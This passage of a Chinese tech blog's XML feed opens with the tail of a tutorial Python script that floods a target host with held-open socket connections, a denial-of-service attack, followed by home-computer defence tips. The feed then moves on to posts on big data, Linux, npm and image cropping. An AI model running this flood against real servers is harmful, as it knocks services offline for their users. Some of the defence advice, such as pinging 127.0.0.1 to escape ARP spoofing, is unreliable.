class="hljs-title">conn_thread</span><span class="hljs-params">()</span>:</span>    <span class="hljs-keyword">global</span> socks    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">0</span>,MAX_CONN):        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)        <span class="hljs-keyword">try</span>:            s.connect((HOST,PORT))            s.send(buf.encode())            <span class="hljs-keyword">print</span> (<span class="hljs-string">"Send buf OK!,conn=%d\n"</span>%i)            socks.append(s)        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> ex:            <span class="hljs-keyword">print</span> (<span class="hljs-string">"Could not connect to server or send error:%s"</span>%ex)            time.sleep(<span class="hljs-number">0.1</span>)<span class="hljs-comment">#end def</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">send_thread</span><span class="hljs-params">()</span>:</span>    <span class="hljs-keyword">global</span> socks    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:        <span class="hljs-keyword">for</span> s <span class="hljs-keyword">in</span> socks:            <span class="hljs-keyword">try</span>:                s.send(<span class="hljs-string">"f"</span>.encode())                <span class="hljs-comment">#print "send OK!"</span>            <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> ex:                <span class="hljs-keyword">print</span> (<span class="hljs-string">"Send Exception:%s\n"</span>%ex)                socks.remove(s)                s.close()        time.sleep(<span class="hljs-number">0.1</span>)<span class="hljs-comment">#end def</span>conn_th=threading.Thread(target=conn_thread,args=())send_th=threading.Thread(target=send_thread,args=())conn_th.start()send_th.start()</code></pre></div><h1 id="防护"><a href="#防护" class="headerlink" title="防护"></a>防护</h1><h2 id="预防"><a href="#预防" class="headerlink" title="预防"></a>预防</h2><p>最简单最基础的网络攻击讲完了，那么接下来该学学学习如何保护自己的计算机啦(*σ´∀`)σ  </p><ul><li><p>如果是Win10，打开自带的Defender<br>傻瓜式设置，按照系统的提示把防火墙什么的都打开  </p></li><li><p>无特殊情况不装360安全卫士，并且卸载360的所有软件    </p></li><li><p>尽量不要安装破解软件  </p></li><li><p>看到明显的恶意捆绑软件不要安装，以及defender提示病毒的软件也尽量不要安装。    </p></li><li><p>不进不明不网站，不收奇怪邮件。下载完压缩包文件后先进行病毒扫描  </p></li><li><p>关闭不必要的端口  </p></li></ul><h2 id="如何应对攻击"><a href="#如何应对攻击" class="headerlink" title="如何应对攻击"></a>如何应对攻击</h2><p>接下来，我们来看看如何应对攻击  </p><p><strong>应对DDoS攻击</strong>：<br>其实目前对上DDoS攻击都是个很烦事情。<br>要想完全不受DDos攻击的危害——断网。<br>打开cmd窗口，输入net stop Service,关闭Windows网络服务。<br>关闭后，即可免遭危害。（滑稽）</p><p><strong>应对DNS欺骗</strong>：<br>重启网络路由，将浏览器全部还原为原设置。</p><p><strong>应对ARP欺骗</strong>：<br>重启网络路由，将浏览器（需要网络的软件）全部还原为默认设置。接着打开cmd窗口，输入arp -a，如果显示：没有ARP缓存表，说明你还在遭遇此攻击，否则你就已脱离了危险。接着，输入ping -t -l 10 127.0.0.1 ,不停地PING轮回IP，使其防止网络堵塞，还可能会摆脱危险。接着，打开资源监视器，找到网络，看看是谁在不断给你发送ARP数据包。找到后，立即找专业人员进行询问和修理，并且将此IP提交给专业人员。</p><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p><a href="https://blog.csdn.net/tiantian520ttjs/article/details/103107836" target="_blank" rel="noopener">[1] Python3.7黑帽编程——病毒篇（基础篇）：tiantian520_tt</a><br><a href="http://m.elecfans.com/article/838613.html" target="_blank" rel="noopener">[2] 计算机病毒类型：发烧友学院 </a><br><a href="https://blog.csdn.net/weixin_38635069/article/details/80557636" target="_blank" rel="noopener">[3]各类计算机病毒介绍：薛定谔的小橙子</a><br><a href="https://www.cnblogs.com/yyhh/p/5140852.html" target="_blank" rel="noopener">[4] Fiddler抓包工具总结：代码改变世界</a><br><a href="https://blog.csdn.net/gufenchen/article/details/90895856" target="_blank" rel="noopener">[5]常用的几款抓包工具：白清羽</a><br><a href="https://blog.csdn.net/qq_41658919/article/details/82501760" target="_blank" rel="noopener">[6] 黑客的基础知识：残念(￣▽￣)／王司徒</a><br><a href="https://blog.csdn.net/tiantian520ttjs/article/details/103435385" target="_blank" rel="noopener">[7]计算机网络安全——保护自己的计算机（基础）</a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 运维 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 信息安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>大数据的概念及应用</title>
      <link href="/2020/04/26/%E5%A4%A7%E6%95%B0%E6%8D%AE%E7%9A%84%E6%A6%82%E5%BF%B5%E5%8F%8A%E5%BA%94%E7%94%A8/"/>
      <url>/2020/04/26/%E5%A4%A7%E6%95%B0%E6%8D%AE%E7%9A%84%E6%A6%82%E5%BF%B5%E5%8F%8A%E5%BA%94%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<p>2020年版</p><a id="more"></a><h2 id="概念："><a href="#概念：" class="headerlink" title="概念："></a>概念：</h2><p>大数据很火热，但实际上能准确说出的概念的人很少。<br>为了为之后学习Hadoop打下概念基础以便更容易掌握学习框架，先来看看维基百科和百度百科介绍大数据：</p><p><strong>维基百科中文</strong>：大数据（英语：Big data），又称为巨量资料，指的是在传统数据处理应用软件不足以处理的大或复杂的数据集的术语。</p><p>大数据也可以定义为来自各种来源的大量非结构化或结构化数据。从学术角度而言，大数据的出现促成广泛主题的新颖研究。这也导致各种大数据统计方法的发展。大数据并没有统计学的抽样方法；它只是观察和追踪发生的事情。因此，大数据通常包含的数据大小超出传统软件在可接受的时间内处理的能力。由于近期的技术进步，发布新数据的便捷性以及全球大多数政府对高透明度的要求，大数据分析在现代研究中越来越突出。$^{[1]}$</p><p><strong>百度百科</strong>：大数据（big data），IT行业术语，是指无法在一定时间范围内用常规软件工具进行捕捉、管理和处理的数据集合，是需要新处理模式才能具有更强的决策力、洞察发现力和流程优化能力的海量、高增长率和多样化的信息资产。<br>大数据的5V特点（IBM提出）：Volume（大量）、Velocity（高速）、Variety（多样）、Value（低价值密度）、Veracity（真实性）。$^{[2]}$</p><p>也许有人搜索一下百科就以为这是大数据的定义，<strong>但</strong>没人说这就是大数据的定义，这两段是简要地概括一下大数据的概念、结构、特性等。事实上，个人感觉大数据的概念不是一两句话就能讲清的。不然的话，林子雨老师就不会用一整整一章的内容来讲解大数据的概念。$^{[3]}$  </p><p>如果多搜集资料你就会发现，每个人对大数据大数据的讲解都有些许不同，也许一千个读者眼里的哈姆雷特是一样的，但每个读者或多或少表达的倾向不一样。同理，大数据的概念我说是说不清的了，这辈子都说不清的了，但请记住大数据的几点特点：<strong>数据量大、数据类型繁多、处理速度快、价值密度低</strong>。</p><h2 id="应用"><a href="#应用" class="headerlink" title="应用"></a>应用</h2><p>大数据无处不在，包括金融、汽车、零售、餐饮、电信、能源、政务、医疗、体育、娱乐等在内的社会各行各业都已经融入了大数据的印迹。具体案例在此不详细介绍啦，有兴趣可以看<a href="https://www.zhihu.com/question/38446718" target="_blank" rel="noopener">知乎问题：基于大数据的成功应用有哪些？</a>  </p><h1 id="大数据技术的不同层面及其功能"><a href="#大数据技术的不同层面及其功能" class="headerlink" title="大数据技术的不同层面及其功能"></a>大数据技术的不同层面及其功能</h1><p><strong>数据采集</strong>：利用ETL工具将分布的、异构数据源中的数据如关系数据、平面数据文件等，抽取到临时中间层后进行清洗、转换、集成，最后加载到数据仓库或数据集市中，成为联机分析处理、数据挖掘的基础；或者也可以把实时采集的数据作为流计算系统的输入，进行实时处理分析。  </p><p><strong>数据存储和管理</strong>： 利用分布式文件系统、数据仓库、关系数据库、NoSQL数据库、云数据库等，实现对结构化、半结构化和非结构化海量数据的存储和管理。  </p><p><strong>数据处理与分析</strong>： 利用分布式并行编程模型和计算框架，结合机器学习和数据挖掘算法，实现对海量数据的处理和分析；对分析结果进行可视化呈现，帮助人们更好地理解数据、分析数据。  </p><p><strong>数据隐私和安全</strong>：在从大数据中挖掘潜在的巨大商业价值和学术价值的同时，构建隐私数据保护体系和数据安全体系，有效保护个人隐私和数据安全。  </p><p><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/308a4168628691ae73290e5ede3f121.jpg" srcset="/img/loading.gif" lazyload="" alt="大数据核心技术：分布式系统"></p><h1 id="数据计算模式及产业"><a href="#数据计算模式及产业" class="headerlink" title="数据计算模式及产业"></a>数据计算模式及产业</h1><p><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/c8930b782b303b36f4200318b631d4b.jpg" srcset="/img/loading.gif" lazyload="" alt="大数据计算模式及其代表产品"></p><p>上述大数据产品中有不少就是后续的篇章里将介绍如何使用的，MapReduce、hive等，在此引用某一案例来了解下批处理和流计算。  </p><p>大数据处理系统通常采用并行化的策略进行数据处理，每个阶段由与分区数相同个数的任务组成，一个任务负责处理一个分区，各个任务之间相互独立执行，不会发生数据交换。<br><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/9bf808f7f216a8477df1f13b2fd8acb.jpg" srcset="/img/loading.gif" lazyload="" alt="物理数据流图"></p><ul><li>批处理</li></ul><p><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/f100169fa907362bd568b22998c3bd9.jpg" srcset="/img/loading.gif" lazyload="" alt="批处理引擎中的物理数据流图"></p><p>在批处理引擎中，一个物理数据流图通常被划分为多个阶段，阶段之间根据依赖关系按序执行，一个阶段只有等其依赖的所有阶段都执行结束后才能开始执行。<br>例如，在基于批处理引擎的Spark系统中，将每个逻辑数据流图根据给定的并行度转换为物理数据流图后，系统会根据数据交换将该物理数据流图划分为多个阶段按序执行。如图3所示，因为在按键值分组顶点处发生数据交换，所以整个物理数据流图在此处被切分，形成阶段0和阶段1两个阶段。其中，阶段1中的数据处理依赖于阶段0处理后的中间结果，即2个阶段的执行存在先后顺序，阶段1只有在阶段0的处理全部完成后才能开始执行。在阶段0中，系统启动3个线程分别处理相互独立的3个分区中的数据，并将得到的中间结果存储在3个线程各自的本地磁盘上。等到阶段0中的3个线程都完成处理后，系统开始进行阶段1的处理，阶段1中启动2个线程分别负责2个分区的数据，每个线程通过网络从阶段0的中间结果处获取属于自己的数据进行后续处理。</p><p><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/2d91dd7c6becb6ffae3ee6da76ffd9b.jpg" srcset="/img/loading.gif" lazyload="" alt="流计算引擎中的物理数据流图"></p><p>在流计算引擎中，物理数据流图不会被划分为多个阶段。任务之间的数据交换不需要将中间结果数据先写入磁盘再发送给下游任务，而是在处理完一条数据后立即将其发送给下游任务。</p><h2 id="大数据产业"><a href="#大数据产业" class="headerlink" title="大数据产业"></a>大数据产业</h2><ul><li>大数据产业是指一切与支撑大数据组织管理和价值发现相关的企业经济活动的集合。</li></ul><p><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/b846b8e10cfe5728b369505dd0cd4a6.jpg" srcset="/img/loading.gif" lazyload="" alt=""></p><h2 id="大数据产品市场调查"><a href="#大数据产品市场调查" class="headerlink" title="大数据产品市场调查"></a>大数据产品市场调查</h2><p>大数据平台市场分布对==就业==等或许有些影响（也许、可能、大概），毕竟供求决定价格。上面已经介绍了一些大数据计算模式和产品，那么现在就来看看调查报告吧。</p><h3 id="大数据技术应用场景相对单一"><a href="#大数据技术应用场景相对单一" class="headerlink" title="大数据技术应用场景相对单一"></a>大数据技术应用场景相对单一</h3><ul><li>77%的企业在运用大数据技术</li><li>目前61%的企业对大数据的应用更多地体现在统计分析、报表及数据可视化上</li><li>Spark、Redis和Kafka正在成为企业大数据平台通用技术组件。</li></ul><h3 id="企业构建大数据平台的主要方式"><a href="#企业构建大数据平台的主要方式" class="headerlink" title="企业构建大数据平台的主要方式"></a>企业构建大数据平台的主要方式</h3><p>随着分布式计算和云平台的逐步成熟，目前大部分公司都有能力搭建自己的大数据平台。调研数据显示，81% 企业在进行大数据相关的开发和应用，50% 的企业选择私有云解决方案来部署大数据应用，28% 的企业选择自主研发。私有云部署解决方案是企业构建大数据平台的主要方式。</p><p><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/image-20200630224530412.png" srcset="/img/loading.gif" lazyload="" alt="企业大数据平台构建方式分布"></p><h3 id="企业使用-Hadoop-版本搭建数据平台情况"><a href="#企业使用-Hadoop-版本搭建数据平台情况" class="headerlink" title="企业使用 Hadoop 版本搭建数据平台情况"></a>企业使用 Hadoop 版本搭建数据平台情况</h3><p>调查报告发现，有 30% 以上的企业并没有使用相对成熟的 Hadoop 技术搭建数据平台，这些企业的算法性能会很大程度上受限于低效的平台，更不可能开发出更高效的数据分析算法。但幸运的是大部分企业都基于商业版或者社区版 Hadoop 搭建了数据平台，这些公司的侧重点主要在应用发现和算法的设计层面，更有可能在不久的将来实现大数据的价值。</p><p><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/image-20200630224635515.png" srcset="/img/loading.gif" lazyload="" alt="企业使用Hadoop搭建大数据平台情况"></p><h3 id="企业大数据平台的普遍组件"><a href="#企业大数据平台的普遍组件" class="headerlink" title="企业大数据平台的普遍组件"></a>企业大数据平台的普遍组件</h3><p>Apache Spark 是一个处理大规模数据的快速通用引擎，它可以独立运行，也可以在 Hadoop、Mesos、云端运行，它可以访问各种数据源包括 HDFS、Cassandra、HBase 和 S3，可以提升 Hadoop 集群中的应用在内存和磁盘上的运行速度。Spark 生态系统中除了核心 API 之外，还包括其他附加库，可以为大数据分析和机器学习领域提供更多的能力。本次调研中，Spark 是使用最普遍的大数据平台组件，使用率达到44%，而MapReduce使用率仅为21%。</p><p><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/image-20200630224927300.png" srcset="/img/loading.gif" lazyload="" alt="企业大数据平台包含组件分布(调查项为多选)"></p><p>分布式文件系统 HDFS 作为核心组件之一，使用率也达到了 39%。企业对大数据平台应用最多的场景是统计分析、报表生成及数据可视化，38% 企业使用ELK（ElasticSearch + Logstash + Kibana）实时日志分析平台。  </p><p>综上所述，目前大数据的发展热潮令人欢欣鼓舞。一个优秀的大数据团队，需要有对产品开发具有高敏感性同时对技术有一定理解的人才，同时需要理论基础极其扎实，能对实际问题进行抽象建模和算法设计的人才。只有双管齐下，在产品和技术方面进行深层次探索，才能真正实现大数据产业的繁荣。</p><h1 id="大数据与云计算、物联网"><a href="#大数据与云计算、物联网" class="headerlink" title="大数据与云计算、物联网"></a>大数据与云计算、物联网</h1><p>云计算、大数据和物联网相辅相成，既有联系又有区别。  </p><p><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/317ee68ccc639db209ae0faba526c8f.jpg" srcset="/img/loading.gif" lazyload="" alt="大数据与云计算、物联网的关系"></p><h2 id="云计算"><a href="#云计算" class="headerlink" title="云计算"></a>云计算</h2><p><strong>概念</strong>：云计算实现了通过网络提供可伸缩的、廉价的分布式计算能力，用户只需要在具备网络接入条件的地方，就可以随时随地获得所需的各种IT资源。</p><p><strong>关键技术</strong>：  虚拟化、分布式存储、分布式计算、多租户等。</p><p><strong>数据中心</strong>：</p><ul><li>云计算数据中心是一整套复杂的设施，包括刀片服务器、宽带网络连<br>接、环境控制设备、监控设备以及各种安全装置等</li><li>数据中心是云计算的重要载体，为云计算提供计算、存储、带宽等各种硬件资源，为各种平台和应用提供运行支撑环境</li><li>全国各地推进数据中心建设。</li></ul><p><strong>应用</strong>：  </p><ul><li>政务云上可以部署公共安全管理、容灾备份、城市管理、应急管理、智能交通、社会保障等应用，通过集约化建设、管理和运行，可以实现信<br>息资源整合和政务资源共享，推动政务管理创新，加快向服务型政府转型。</li><li>教育云可以有效整合幼儿教育、中小学教育、高等教育以及继续教育等优质教育资源，逐步实现教育信息共享、教育资源共享及教育资源深度挖掘等目标。</li><li>中小企业云能够让企业以低廉的成本建立财务、供应链、客户关系等管理应用系统，大大降低企业信息化门槛，迅速提升企业信息化水平，增强企业市场竞争力。</li><li>医疗云可以推动医院与医院、医院与社区、医院与急救中心、医院与家庭之间的服务共享，并形成一套全新的医疗健康服务系统，从而有效地提高医疗保健的质量。</li></ul><p><strong>产业</strong>：  云计算产业作为战略性新兴产业，近些年得到了迅速发展，形成了成熟的产业链结构，产业涵盖硬件与设备制造、基础设施运营、软件与解决方案供应商、基础设施即服务（IaaS）、平台即服务（PaaS）、软件即服务（SaaS）、终端设备、云安全、云计算交付/咨询/认证等环节。</p><h2 id="物联网"><a href="#物联网" class="headerlink" title="物联网"></a>物联网</h2><p><strong>概念</strong>：物联网是物物相连的互联网，是互联网的延伸，它利用局部网络或互联网等通信技术把传感器、控制器、机器、人员和物等通过新的方式联在一起，形成人与物、物与物相联，实现信息化和远程管理控制。  </p><p><strong>关键技术</strong>：   物联网中的关键技术包括识别和感知技术（二维码、RFID、传感器等）、网络与通信技术、数据挖掘与融合技术等。</p><p><strong>应用</strong>：  物联网已经广泛应用于智能交通、智慧医疗、智能家居、环保监测、智能安防、智能物流、智能电网、智慧农业、智能工业等领域，对国民经济与社会发展起到了重要的推动作用。</p><p><strong>产业</strong>：   完整的物联网产业链主要包括核心感应器件提供商、感知层末端设备提供商、网络提供商、软件与行业解决方案提供商、系统集成商、运营及服务提供商等六大环节。</p><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p><a href="https://wikipediam.tw.wjbk.site/wiki/%E5%A4%A7%E6%95%B0%E6%8D%AE" target="_blank" rel="noopener">[1] 大数据——维基百科中文</a><br><a href="https://m.baidu.com/sf_bk/item/%E5%A4%A7%E6%95%B0%E6%8D%AE/1356941?fr=kg_general&amp;ms=1&amp;rid=7658366459364706321" target="_blank" rel="noopener">[2] 大数据——百度百科</a><br><a href="http://dblab.xmu.edu.cn/post/1089/" target="_blank" rel="noopener">[3] 《大数据技术基础》：林子雨</a><br><a href="http://dblab.xmu.edu.cn/post/bigdata/" target="_blank" rel="noopener">[4] 《大数据技术原理与应用》第二版：林子雨</a><br><a href="https://m.sohu.com/a/250942206_495461/?pvid=000115_3w_a" target="_blank" rel="noopener">[5] 大数据存储、计算、应用、可视化的基本概述：迅宜捷科技</a><br><a href="https://m.baidu.com/sf_baijiahao/s?id=1659675532780997134&amp;wfr=spider&amp;for=pc" target="_blank" rel="noopener">[6] 两成开发者月薪超 1.7 万、算法工程师最紧缺：CSDN</a><br><a href="https://blog.csdn.net/chaishen10000/article/details/88564869" target="_blank" rel="noopener">[7] 2018-2019中国开发者调查报告简报（一文了解全貌）：柴神</a><br><a href="http://kns.cnki.net/KXReader/Detail?TIMESTAMP=637187568097763750&amp;DBCODE=CJFQ&amp;TABLEName=CAPJLAST&amp;FileName=DSJU20200220002&amp;RESULT=1&amp;SIGN=%2b3iFHhJ4zUnvkh5iaJ13uCgMcBI%3d" target="_blank" rel="noopener">[8]毕倪飞,丁光耀,陈启航,徐辰,周傲英. 数据流计算模型及其在大数据处理中的应用[J]. 大数据,,:1-19.</a><br><a href="http://kns.cnki.net/KXReader/Detail?TIMESTAMP=637187548969326250&amp;DBCODE=CJFQ&amp;TABLEName=CAPJLAST&amp;FileName=DSJU20200226002&amp;RESULT=1&amp;SIGN=EhYpH0Pm9adr3aMcD3MW2sgqjCU%3d" target="_blank" rel="noopener">[9]袁旭初,付国,毕继泽,张岩峰,聂铁铮,谷峪,鲍玉斌,于戈. 分布式数据流计算系统的数据缓存技术综述[J]. 大数据,,:1-22.</a>  </p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 大数据技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Hadoop </tag>
            
            <tag> Spark </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux踩坑</title>
      <link href="/2020/04/26/Linux%E8%B8%A9%E5%9D%91/"/>
      <url>/2020/04/26/Linux%E8%B8%A9%E5%9D%91/</url>
      
        <content type="html"><![CDATA[<p>大坑</p><a id="more"></a><ul><li><p>打开管理员权限文件管理：<code>sudo nautilus</code><br>（用于拷贝文件的时候出现权限不够的情况）  </p></li><li><p>vim强行保存只读文件 <code>w !sudo tee %</code></p></li><li><p>centos7中python读取文件需要填写绝对路径（试过windows的PC上能运行，但是服务器上提示读取不到该文件）</p></li></ul><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 运维 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>npm包管理</title>
      <link href="/2020/04/21/npm%E5%8C%85%E7%AE%A1%E7%90%86/"/>
      <url>/2020/04/21/npm%E5%8C%85%E7%AE%A1%E7%90%86/</url>
      
        <content type="html"><![CDATA[<p>来看看npm安装并管理众多的软件包安装</p><a id="more"></a><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>npm是个包管理工具（想象一个项目中上千个包该怎么管理，嗯，到底香在哪里不用我多说了吧？）</p><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><ol><li>安装git</li><li>安装并配置nodejs</li></ol><h3 id="安装git"><a href="#安装git" class="headerlink" title="安装git"></a>安装git</h3><p>下载并安装Git，在<code>我的电脑-鼠标右键添加属性-高级系统设置-环境变量-系统变量-Path</code>处添加变量，例如安装路径是<code>D:\Git</code>，那么就添加变量</p><p><a href="https://blog.csdn.net/sanxd/article/details/82624127" target="_blank" rel="noopener">具体看这个吧，太久了～我怕遗漏了什么步骤</a></p><p><code>D:\Git\usr\bin\</code></p><p><code>D:\Git\usr\bin\ssh-keygen.exe</code></p><p>这样就能在电脑的任意文件夹位置打开git</p><p><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/80ef2b6371e96bf39133297493ccf7e.png" srcset="/img/loading.gif" lazyload="" alt=""></p><h3 id="安装nodejs"><a href="#安装nodejs" class="headerlink" title="安装nodejs"></a>安装nodejs</h3><p>nodejs安装没什么好说的，建议安装<code>最高版本的稳定版本</code>，直接在官网下载然后下一步～下一步</p><p><a href="https://nodejs.org/dist/" target="_blank" rel="noopener">https://nodejs.org/dist/</a>    官网，直接选择合适的版本</p><p>如果不知道怎么选，可以下载这个 <a href="https://nodejs.org/dist/v12.10.0/（现在是2020年）" target="_blank" rel="noopener">https://nodejs.org/dist/v12.10.0/（现在是2020年）</a></p><h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><p>安装淘宝镜像</p><p>npm config set registry <a href="https://registry.npm.taobao.org" target="_blank" rel="noopener">https://registry.npm.taobao.org</a></p><p>之后就用<code>cnpm</code>命令代替<code>npm</code>命令了</p><p>##　使用</p><p>一般项目把代码放到github等平台，都不会放依赖包的，为什么？因为有些人有这些依赖包了，有些人又没人，而且全都放到代码托管平台可能导致文件很大，所以合适的方式是写清楚自己用了什么依赖包。这些依赖包信息会写在一个叫<code>package.json</code>的文件，这个package.json打开是这样子的：</p><p><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/image-20200713015959811.png" srcset="/img/loading.gif" lazyload="" alt="package.json文件内容"></p><p>不用管这个，如果要安装上述依赖包，那么只要在放着package.json的这个文件目录打开<code>git bash</code>，输入</p><div class="hljs code-wrapper"><pre><code class="hljs cmake">cnpm <span class="hljs-keyword">install</span></code></pre></div><p>（这里使用淘宝镜像，所以是cnpm；如果不使用淘宝镜像则是<code>npm install</code>）</p><p>然后会在当前目录生成一个<code>node_modules</code>文件夹，这个文件夹里就放着依赖包。</p><h2 id="关于全局与局部安装依赖包"><a href="#关于全局与局部安装依赖包" class="headerlink" title="关于全局与局部安装依赖包"></a>关于全局与局部安装依赖包</h2><p>如果要安装某个依赖包，例如安装hexo-renderer-marked，则输入</p><div class="hljs code-wrapper"><pre><code class="hljs sql">cnpm <span class="hljs-keyword">install</span> hexo-renderer-kramed <span class="hljs-comment">--save</span></code></pre></div><p>这样依赖包会安装在<strong>当前目录的</strong><code>node_modules</code>文件夹里，这种是局部安装的模式</p><p>如果输入的是</p><div class="hljs code-wrapper"><pre><code class="hljs cmake">cnpm <span class="hljs-keyword">install</span> -g hexo-renderer-kramed</code></pre></div><p>则会安装到你的node文件夹目录下，即全局安装</p><h3 id="关于版本号"><a href="#关于版本号" class="headerlink" title="关于版本号"></a>关于版本号</h3><p>如果要安装指定版本，可以在依赖包后面加上 <code>@版本号</code>，例如：</p><div class="hljs code-wrapper"><pre><code class="hljs angelscript">cnpm install hexo-renderer-<span class="hljs-symbol">kramed@</span><span class="hljs-number">0.1</span><span class="hljs-number">.4</span>  --save</code></pre></div><p>有时候会见到<code>@^版本号</code>这样的，^表示匹配较高版本的包</p><ul><li><code>~</code>会匹配最近的小版本依赖包，比如@~1.2.3会匹配所有1.2.x版本，但是不包括1.3.0</li><li><code>^</code>会匹配最新的大版本依赖包，比如@^1.2.3会匹配所有1.x.x的包，包括1.3.0，但是不包括2.0.0</li></ul><p>如果是卸载，在install前面加个un就行啦，例如：</p><div class="hljs code-wrapper"><pre><code class="hljs sql">cnpm <span class="hljs-keyword">uninstall</span> hexo-renderer-kramed <span class="hljs-comment">--save</span></code></pre></div><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 运维 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 建站 </tag>
            
            <tag> 前端 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>图像裁剪</title>
      <link href="/2020/04/04/%E5%9B%BE%E5%83%8F%E8%A3%81%E5%89%AA/"/>
      <url>/2020/04/04/%E5%9B%BE%E5%83%8F%E8%A3%81%E5%89%AA/</url>
      
        <content type="html"><![CDATA[<p>图像裁剪成指定的分辨率大小</p><a id="more"></a><ul><li><p>文件目录树</p><div class="hljs code-wrapper"><pre><code class="hljs css">│  <span class="hljs-selector-tag">ImageCut</span><span class="hljs-selector-class">.py</span>│├─<span class="hljs-selector-tag">cut_img</span>│     <span class="hljs-selector-tag">cut_test</span><span class="hljs-selector-class">.jpg</span>│└─<span class="hljs-selector-tag">images</span>      <span class="hljs-selector-tag">test</span><span class="hljs-selector-class">.jpg</span></code></pre></div></li></ul><hr><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment"># 导入相关的库</span><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<span class="hljs-keyword">import</span> os<span class="hljs-comment">#读取images文件夹内的图片名称</span>images_list = os.listdir(<span class="hljs-string">'images/'</span>)<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">0</span>,len(images_list),<span class="hljs-number">1</span>):    <span class="hljs-comment"># 打开一张图</span>    img = Image.open(<span class="hljs-string">"images/"</span>+images_list[i])    <span class="hljs-comment"># 图片尺寸</span>    img_size = img.size    h = img_size[<span class="hljs-number">1</span>]  <span class="hljs-comment"># 图片高度</span>    w = img_size[<span class="hljs-number">0</span>]  <span class="hljs-comment"># 图片宽度</span>    x = <span class="hljs-number">0.2</span> * w    y = <span class="hljs-number">0.1</span> * h    w = <span class="hljs-number">0.55</span> * w    h = <span class="hljs-number">0.75</span> * h    <span class="hljs-comment"># 开始截取</span>    region = img.crop((x, y, x + w, y + h))    <span class="hljs-keyword">if</span> (os.path.exists(<span class="hljs-string">'cut_img'</span>)==<span class="hljs-literal">False</span>):        os.mkdir(<span class="hljs-string">"cut_img"</span>)    <span class="hljs-comment"># 保存图片</span>    region.save(<span class="hljs-string">"cut_img"</span>+<span class="hljs-string">"/"</span>+<span class="hljs-string">"cut_"</span>+images_list[i])</code></pre></div><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 计算机视觉 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> matlab </tag>
            
            <tag> 图像处理 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
